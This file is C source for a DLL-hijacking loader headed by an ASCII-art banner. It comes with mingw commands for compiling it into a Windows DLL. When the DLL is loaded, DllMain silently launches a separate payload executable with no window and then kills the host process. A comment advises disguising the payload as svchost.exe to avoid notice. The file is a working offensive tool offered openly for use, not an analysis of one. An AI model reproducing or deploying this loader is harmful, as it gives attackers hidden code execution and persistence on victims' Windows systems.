//  ┓      ┓       ┓  ┓   
// ┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
// ┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
//            ┛          ┛
// ┳┓┏┓┓┏┏┓┏┓┓┏┓          
// ┃┃ ┫┣┫┣┫┃ ┃┫           
// ┻┛┗┛┛┗┛┗┗┛┛┗┛          
// For best results use this script on Linux machine for compile
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// Your payload.exe must be in blabla here

#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        
        si.cb = sizeof(STARTUPINFO);

        // Path to your Payload executable
        // Better result use "C:\Windows\svchost.exe" original SVC Host located on System32 Folder
        LPCSTR command = "C:\\blabla.exe";

        if (CreateProcess(
                NULL,          
                (LPSTR)command, 
                NULL,          
                NULL,          
                FALSE,         
                CREATE_NO_WINDOW, 
                NULL,          
                NULL,          
                &si,           
                &pi            
        )) {

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
			
        }

        ExitProcess(0);
    }
    return TRUE;
}